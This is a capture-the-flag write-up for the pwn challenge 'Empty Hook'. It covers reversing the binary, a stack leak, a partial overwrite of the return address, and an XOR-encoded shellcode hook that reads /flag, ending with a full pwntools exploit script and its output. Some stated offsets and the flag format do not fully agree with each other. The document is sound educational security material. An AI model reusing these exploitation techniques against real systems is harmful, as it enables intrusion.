# Empty Hook

## Challenge Information

You know there is an empty hook waiting for you?

- Author: shiguang
- Flag Format: `PUCTF26{[a-zA-Z0-9_]+_[a-fA-F0-9]{32}}`
- Category: `Pwn / Exploitation`
- Hint: `The path to flag is /flag`
- Hint 2: `There are two stages`

# Overview

This challenge is about abusing the program's own hook system.

The binary contains an empty executable area. Later, the program can read user data, decode it, write the decoded bytes into that area, and call it as a hook. So the real goal is not to build a large ROP chain. The real goal is to understand how the hook-loading path works, then make the program execute our code for us.

The hint already gives `/flag`, so the final payload is clear. I do not need a shell. I only need code that does:

- `openat("/flag")`
- `read`
- `write`

The whole solve path is:

1. leak a stack address and a one-byte `seed`
2. use a stack overflow with partial overwrite to reach the `data:` path
3. send a valid encoded hook payload
4. let the program patch the empty hook area and execute code that prints `/flag`

# Initial Analysis

## File Checks

I started with basic file information and protections.

Commands used:

```bash
file ./chal
checksec file ./chal
```

Output:

```text
./chal: ELF 64-bit LSB pie executable, x86-64, stripped

RELRO           Stack Canary      CFI               NX            PIE             RPATH      RUNPATH      Symbols
Full RELRO      No Canary Found   SHSTK & IBT       NX enabled    PIE Enabled     No RPATH   No RUNPATH   No Symbols
```

This already suggests a few things:

- there may be a stack overflow because there is no canary
- normal stack shellcode is not ideal because NX is enabled
- CET is enabled, so rough ROP may be annoying
- the intended path is probably something already built into the binary

## Program Interaction

Then I ran the program once to see the basic interaction.

```bash
./chal
```

The interaction looks like this:

```text
hi
say:
<input>
What's your input?
It seems that something is lost. QAQ
bye
hook: rejected
```

This already tells me:

- the program has more than one input stage
- there is a hook-related path
- `hook: rejected` is probably the failure case of the hook system

## First Look At Strings

Next I checked strings.

```bash
strings ./chal
```

The most useful strings are:

```text
data:
say:
What's your input?
It seems that something is lost. QAQ
bye
hook: rejected
```

From this alone, one rough picture is already visible:

- first there is normal input handling
- later there is a `data:` path
- bad hook data leads to `hook: rejected`

# Tracing The Main Flow

At this point I still do not know the whole program. I only know the likely direction.

So I used disassembly and `.rodata` to connect strings to code.

Commands used:

```bash
objdump -d -Mintel ./chal
objdump -s -j .rodata ./chal
readelf -r -W ./chal
```

The main idea is simple:

```text
string -> rodata offset -> code reference -> nearby calls -> function behavior
```

## Matching `.rodata` Strings

First I checked `.rodata`.

```bash
objdump -s -j .rodata ./chal
```

Relevant output:

```text
Contents of section .rodata:
 2000 01000200 00000000 64617461 3a006869  ........data:.hi
 2010 00736179 3a005768 61742773 20796f75  .say:.What's you
 2020 7220696e 7075743f 00000000 00000000  r input?........
 2030 49742073 65656d73 20746861 7420736f  It seems that so
 2040 6d657468 696e6720 6973206c 6f73742e  mething is lost.
 2050 20514151 00627965 00686f6f 6b3a2072   QAQ.bye.hook: r
 2060 656a6563 74656400 6e6f00             ejected.no.
```

From this, the useful string offsets are:

```text
0x200e -> "hi"
0x2011 -> "say:"
0x2016 -> "What's your input?"
0x2030 -> "It seems that something is lost. QAQ"
0x2055 -> "bye"
0x2059 -> "hook: rejected"
```

## Matching `puts` Calls

Then I looked for those string references in the disassembly.

```bash
objdump -d -Mintel ./chal
```

Relevant output:

```asm
120a: 48 8d 3d fd 0d 00 00    lea    rdi,[rip+0xdfd]        # 200e
1211: e8 ca fe ff ff          call   10e0 <puts@plt>

1228: 48 8d 3d e2 0d 00 00    lea    rdi,[rip+0xde2]        # 2011
122f: e8 ac fe ff ff          call   10e0 <puts@plt>

12c4: 48 8d 3d 4b 0d 00 00    lea    rdi,[rip+0xd4b]        # 2016
12cb: e8 10 fe ff ff          call   10e0 <puts@plt>

12d0: 48 8d 3d 59 0d 00 00    lea    rdi,[rip+0xd59]        # 2030
12d7: e8 04 fe ff ff          call   10e0 <puts@plt>

12ea: 48 8d 3d 64 0d 00 00    lea    rdi,[rip+0xd64]        # 2055
12f1: e8 ea fd ff ff          call   10e0 <puts@plt>

130c: 48 8d 3d 46 0d 00 00    lea    rdi,[rip+0xd46]        # 2059
1313: e8 c8 fd ff ff          call   10e0 <puts@plt>
```

This makes the structure much easier to read:

- `120a` prints `hi`
- `1228` prints `say:`
- `12c4` and `12d0` are inside a special branch
- `12ea` prints `bye`
- `130c` prints `hook: rejected`

## Important Input/Output Block

The next important part is the first input and output.

```asm
119b: 48 8d 9d d0 fe ff ff    lea    rbx,[rbp-0x130]
...
1241: ba ff 00 00 00          mov    edx,0xff
1246: 31 ff                   xor    edi,edi
1248: 48 89 de                mov    rsi,rbx
124b: e8 d0 fe ff ff          call   1120 <read@plt>
...
129e: ba 08 01 00 00          mov    edx,0x108
12a3: 48 89 de                mov    rsi,rbx
12a6: bf 01 00 00 00          mov    edi,0x1
12bf: e8 2c fe ff ff          call   10f0 <write@plt>
```

This means:

```c
buf = rbp - 0x130;
read(0, buf, 0xff);
write(1, buf, 0x108);
```

That small block already shows both the future overflow and the future leak.

## Second-Stage Entry

I also wanted to know where `data:` comes from.

The first useful line is:

```asm
12e3: e8 a8 02 00 00          call   1590
```

Then I opened `0x1590`:

```asm
1598: 48 8d 05 69 0a 00 00    lea    rax,[rip+0xa69]        # 2008
159f: 48 89 c7                mov    rdi,rax
15a2: e8 39 fb ff ff          call   10e0 <puts@plt>
15a7: b9 00 09 00 00          mov    ecx,0x900
15ac: 48 8d 05 ad 2a 00 00    lea    rax,[rip+0x2aad]       # 4060
15b3: 48 89 c2                mov    rdx,rax
15b6: be 00 00 00 00          mov    esi,0x0
15bb: bf 00 00 00 00          mov    edi,0x0
15c0: b8 00 00 00 00          mov    eax,0x0
15c5: e8 66 fb ff ff          call   1130 <syscall@plt>
```

This means:

```c
puts("data:");
syscall(SYS_read, 0, global_buf, 0x900);
```

So `data:` is the real second-stage input path.

## Main Pseudocode

After the first pass, I summarized the main logic like this:

```c
int main() {
    char buf[0x80];
    unsigned char seed;

    seed = runtime_derived_byte();

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);

    puts("hi");

    if (!hook_ready)
        decode_hook(seed);

    puts("say:");

    memset(buf, 0, 0x100);
    read(0, buf, 0xff);

    if (special_condition(buf)) {
        write(1, buf, 0x108);
        puts("What's your input?");
        puts("It seems that something is lost. QAQ");
        some_other_path();
    }

    puts("bye");

    if (!hook_ready)
        decode_hook(seed);

    if (!hook_failed) {
        install_seccomp();
        call_hook();
    } else {
        puts("hook: rejected");
    }
}
```

This is not exact source code. It is only a clean summary of behavior.

# Finding The Bugs

## Stack Overflow

The first `read` uses:

```asm
lea rbx, [rbp-0x130]
...
mov edx, 0xff
mov rsi, rbx
xor edi, edi
call read@plt
```

The rough stack layout is:

```text
[rbp-0x130]  input start
...
[rbp]        saved rbp
[rbp+8]      saved RIP
```

So `read(0, buf, 0xff)` clearly reaches saved `rbp` and saved RIP. This is a real stack overflow.

## Fixed-Length Leak

The nearby `write` uses a fixed output size:

```asm
mov edx, 0x108
mov rsi, rbx
mov edi, 1
call write@plt
```

The mismatch is simple:

- input size is at most `0xff`
- output size is always `0x108`

So short input causes a stack leak.

Simple test:

```python
io.recvuntil(b"say:\n")
io.sendline(b"hello")
leak = io.recvn(0x108)
```

This gives:

- `hello` at the start
- many null bytes
- stack data at the end

## Where The Final 8 Bytes Come From

The leaked qword can be understood as:

```c
leak_qword = (seed << 56) | (buf_addr & 0x00ffffffffffffff)
```

So the final 8 bytes give:

- high 1 byte: `seed`
- low 7 bytes: `buf` address

This is why the exploit uses:

```python
leaked_qword = u64(leak[0x100:0x108])
seed = leaked_qword >> 56
buf_addr = leaked_qword & ((1 << 56) - 1)
```

This leak is very strong because it gives both:

- the XOR key for the second-stage payload
- the real stack address of `buf`

## The `%n` Check

There is a scan for `%n`, `%hn`, `%hhn`, `%ln`, and `%lln`.

At first, this looks like a format string challenge. But there is no real sink like `printf(buf)`. So `%n` is not the main bug. It behaves more like a gate.

In practice, the cleaner and more stable path is:

- first input: send a normal short string
- use it only to get the leak

That is why the final script sends `hello`, not `hello%n`.

# Reaching The Second Stage

## Partial Overwrite

Now the useful facts are:

- `buf` can overflow
- `buf` address can leak
- `0x1590` is the second-stage entry

So I do not need a full ROP chain. I only need to move execution into the right nearby block.

First recover the original frame base:

```python
main_rbp = buf_addr + 0x130
```

Then use:

```python
stage1 = b"A" * 0x80 + p64(main_rbp) + b"\xe3"
```

Meaning:

- `A * 0x80` fills up to saved `rbp`
- `p64(main_rbp)` restores saved `rbp`
- `b"\xe3"` changes only the lowest byte of saved RIP

## Why `\xe3`

The reason comes from this block:

```asm
12dc: e8 ef 02 00 00          call   15d0
12e1: eb 07                   jmp    12ea
12e3: e8 a8 02 00 00          call   1590
12e8: eb 00                   jmp    12ea
12ea: 48 8d 3d 64 0d 00 00    lea    rdi,[rip+0xd64]        # 2055
12f1: e8 ea fd ff ff          call   10e0 <puts@plt>
```

This shows:

- `0x12dc` goes to `15d0`
- `0x12e3` goes to `1590`
- both later meet at `0x12ea`

So the target block is `0x12e3`, and the lowest byte of `0x12e3` is `0xe3`.

That is why the final payload ends with:

```python
b"\xe3"
```

This is enough because nearby offsets inside the function stay the same even with PIE.

# Hook Loader And Sandbox

## Hook Loader Rules

Once execution reaches `data:`, the program reads a large payload into a global buffer. Then the hook loader decodes it.

Important rules:

### Magic

```python
payload[0x80:0x84] = p32(0xB136804F)
```

### Hook Length

```python
payload[0x88:0x90] = p64(len(hook))
```

### Sparse Decode

The loader computes:

```python
step = (seed & 3) + 2
start = 0x90 + ((seed >> 2) & 3)
```

Then it decodes:

```python
decoded[i] = payload[start + i * step] ^ seed
```

So we must build:

```python
payload[start + i * step] = hook[i] ^ seed
```

### Target Area

The decoded hook is written to `0x1744`, which is originally a NOP area ending with `ret`.

That is the real meaning of `Empty Hook`.

## Seccomp Limits

Before the hook runs, seccomp is installed.

Important allowed syscalls are:

- `read`
- `write`
- `openat`
- `exit`
- `exit_group`

So the final goal is clearly:

```text
openat("/flag") -> read -> write
```

## `syscall` Filter And Bypass

The loader rejects hooks containing `0f 05`, the raw `syscall` instruction.

So this is not allowed:

```asm
mov eax, 257
syscall
```

But the binary already imports:

- `syscall@plt`
- `read@plt`
- `write@plt`

So the clean bypass is:

- use `call syscall@plt` for `openat`
- use `call read@plt`
- use `call write@plt`

# Final Hook And Payload

## Final Hook

The final hook is:

```asm
sub rsp, 0x40

mov rax, 0x67616c662f
mov [rsp], rax

mov edi, 257
mov esi, -100
mov rdx, rsp
xor ecx, ecx
xor r8d, r8d
call 0x1130

mov edi, eax
lea rsi, [rsp+0x20]
mov edx, 0x40
call 0x1120

mov edx, eax
mov edi, 1
lea rsi, [rsp+0x20]
call 0x10f0

add rsp, 0x40
ret
```

In simple C-like form:

```c
void hook(void) {
    char path[0x20] = {0};
    char buf[0x20] = {0};

    memcpy(path, "/flag", 6);

    int fd = openat(AT_FDCWD, "/flag", O_RDONLY, 0);
    int n = read(fd, buf, 0x40);
    write(1, buf, n);
}
```

Important points:

- `rsp` holds `/flag`
- `rsp+0x20` holds the file content buffer
- there is no raw `syscall` in the hook bytes

Validation:

```python
hook = asm(..., vma=0x1744)
assert len(hook) <= 0x80
assert b"\x0f\x05" not in hook
```

## Stage 2 Builder

```python
def build_stage2(seed, hook):
    step = (seed & 3) + 2
    start = 0x90 + ((seed >> 2) & 3)

    payload = bytearray(start + step * (len(hook) - 1) + 1)
    payload[0x80:0x84] = p32(0xB136804F)
    payload[0x88:0x90] = p64(len(hook))

    for i, byte in enumerate(hook):
        payload[start + i * step] = byte ^ seed

    return bytes(payload)
```

# Final Exploit

The whole exploit is:

```python
io.recvuntil(b"say:\n")
io.sendline(b"hello")

leak = io.recvn(0x108)
leaked_qword = u64(leak[0x100:0x108])

seed = leaked_qword >> 56
buf_addr = leaked_qword & ((1 << 56) - 1)
main_rbp = buf_addr + 0x130

io.recvuntil(b"What's your input?\n")
stage1 = b"A" * 0x80 + p64(main_rbp) + b"\xe3"
io.send(stage1)

io.recvuntil(b"data:\n")
io.send(build_stage2(seed, build_hook()))

print(io.recvall(timeout=3))
```

## `solve.py`

Run it with:

```bash
python3 solve.py REMOTE=1 PORT=33143
```

Full script:

```python
from pwn import *

context.binary = ELF("./chal", checksec=False)
context.arch = "amd64"

HOST = args.HOST or "chal.polyuctf.com"
PORT = int(args.PORT or 33531)

def build_hook():
    hook = asm(
        """
        sub rsp, 0x40

        mov rax, 0x67616c662f
        mov [rsp], rax

        mov edi, 257
        mov esi, -100
        mov rdx, rsp
        xor ecx, ecx
        xor r8d, r8d
        call 0x1130

        mov edi, eax
        lea rsi, [rsp+0x20]
        mov edx, 0x40
        call 0x1120

        mov edx, eax
        mov edi, 1
        lea rsi, [rsp+0x20]
        call 0x10f0

        add rsp, 0x40
        ret
        """,
        vma=0x1744,
    )

    assert len(hook) <= 0x80
    assert b"\x0f\x05" not in hook
    return hook

def build_stage2(seed, hook):
    step = (seed & 3) + 2
    start = 0x90 + ((seed >> 2) & 3)

    payload = bytearray(start + step * (len(hook) - 1) + 1)
    payload[0x80:0x84] = p32(0xB136804F)
    payload[0x88:0x90] = p64(len(hook))

    for i, byte in enumerate(hook):
        payload[start + i * step] = byte ^ seed

    return bytes(payload)

def exploit(io):
    io.recvuntil(b"say:\n")
    io.sendline(b"hello")

    leak = io.recvn(0x108)
    leaked_qword = u64(leak[0x100:0x108])

    seed = leaked_qword >> 56
    buf_addr = leaked_qword & ((1 << 56) - 1)
    main_rbp = buf_addr + 0x130

    log.info(f"seed     = {seed:#x}")
    log.info(f"buf      = {buf_addr:#x}")
    log.info(f"main_rbp = {main_rbp:#x}")

    io.recvuntil(b"What's your input?\n")
    stage1 = b"A" * 0x80 + p64(main_rbp) + b"\xe3"
    io.send(stage1)

    io.recvuntil(b"data:\n")
    io.send(build_stage2(seed, build_hook()))

    return io.recvall(timeout=3)

def main():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(["./chal"])

    data = exploit(io)
    print(data.decode(errors="ignore"))

if __name__ == "__main__":
    main()
```

The command used for the sample solve was:

```bash
python3 solve.py REMOTE=1 PORT=33143
```

Sample successful output:

```text
[x] Opening connection to chal.polyuctf.com on port 33143
[+] Opening connection to chal.polyuctf.com on port 33143: Done
[*] seed     = 0x83
[*] buf      = 0x7fff3bccdfa0
[*] main_rbp = 0x7fff3bcce0d0
[+] Receiving all data: Done (59B)
[*] Closed connection to chal.polyuctf.com port 33143
bye
PUCTF26{DoY0uL1KeHo0k_uRuxzA6TfOB7GXIQHBniK6lYtn82Eedy}
```

Sample intermediate values:

```text
hi
say:
LEAK_LEN = 264
LEAK_LAST8 = a0dfcc3bff7f0083
SEED = 0x83
BUF  = 0x7fff3bccdfa0
RBP  = 0x7fff3bcce0d0
What's your input?
STAGE1_LEN = 137
data:
STEP = 5
START = 0x90
```

These values match the builder formula:

```python
step = (seed & 3) + 2
start = 0x90 + ((seed >> 2) & 3)
```

For `seed = 0x83`:

```text
step = (0x83 & 3) + 2 = 3 + 2 = 5
start = 0x90 + ((0x83 >> 2) & 3) = 0x90 + 0 = 0x90
```

So the computed values match the observed `STEP = 5` and `START = 0x90`.
